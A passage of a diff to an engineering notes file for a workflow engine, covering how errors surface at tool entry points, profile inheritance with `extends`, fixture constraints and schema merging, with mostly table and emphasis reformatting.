-| `workflow.tasks-get` | catches, returns the message as tool output |
+| Entry point                              | What the caller sees                                                                                                                            |
+| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
+| `tool.execute.before` (`bash`, `task`)   | caught, converted to `WorkflowBlockedError` with the reason                                                                                     |
+| `tool.execute.after` (`task`)            | returns cleanly; its own catch at `runtime.ts:1794` logs a warning                                                                              |
+| `workflow.tasks-get`                     | catches, returns the message as tool output                                                                                                     |
 | `workflow.tasks-set`, `tasks-set-status` | ~~throw a raw `ProfileConfigurationError`~~ — **fixed** (`fdd04f8`): the authority check returns the failure as tool output, like its neighbour |
 
 The last row used to be the odd one and the cause was exact: `tasks-get` is
@@ -774,7 +980,7 @@ line or two, so they now say so with `extends` rather than by repetition:
   Each declares only its `transitions`, which is the whole of what those
   scenarios differ by.
 
-`verify-approve-done` is deliberately not among them: it is a *reduced*
+`verify-approve-done` is deliberately not among them: it is a _reduced_
 profile, without gates, dispatch, budget or a verify stage, so inheriting would
 hand back exactly what it is defined by not having.
 
@@ -784,7 +990,7 @@ profile-qualified agent name, and the profile id inside it had to move with the
 directory.
 
 **Constraints that still hold.** A deliberately-invalid fixture must be broken
-*semantically* — an undeclared gate, a transition to a stage that does not
+_semantically_ — an undeclared gate, a transition to a stage that does not
 exist — never by shape: a wrong type throws at `ProfileSchemaSchema.parse`
 before the compiler sees it, so the refusal under test never happens.
 `missing-extends/` is the precedent for keeping one beside the good profiles.
@@ -838,12 +1044,11 @@ one profile do not stay two schemas. `EngineConfig` has no notion of a schema;
 `mergeSchemasToEngineConfig` folds the list flat and provenance is gone.
 Measured, with two independent schemas in one profile:
 
-| | Result |
-| --- | --- |
-| stages | both survive — the only place, and only because the keys differ |
-| `gates`, `requiredGates`, `taskControlAgents`, `editingAgents` | last schema wins, the other is silently dropped |
-| `actionGuards` | last wins per action |
-| transitions | last wins per `from→to` pair |
+|                                               | Result                                                          |
+| --------------------------------------------- | --------------------------------------------------------------- |
+| stages                                        | both survive — the only place, and only because the keys differ |
+| `gates`, `taskControlAgents`, `editingAgents` | last schema wins, the other is silently dropped                 |
+| transitions                                   | last wins per `from→to` pair                                    |
 
 For the real `verify` fixtures this would be fatal and silent: every variant
 declares `code → verify` and `verify → done`, so six of seven would vanish into
@@ -866,7 +1071,7 @@ but unarmed.
    refused with the choices named.
 
 **The half of it that was not in the plan.** Profile resolution used to union
-the schema *file lists* along the `extends` chain, so `android` resolved to
+the schema _file lists_ along the `extends` chain, so `android` resolved to
 `[base.yaml, android.yaml]` and relied on the flattening to become one
 workflow. Under the new rule that is two independent schemas and the session
 would have to choose between them. So a profile's schemas are now its own —
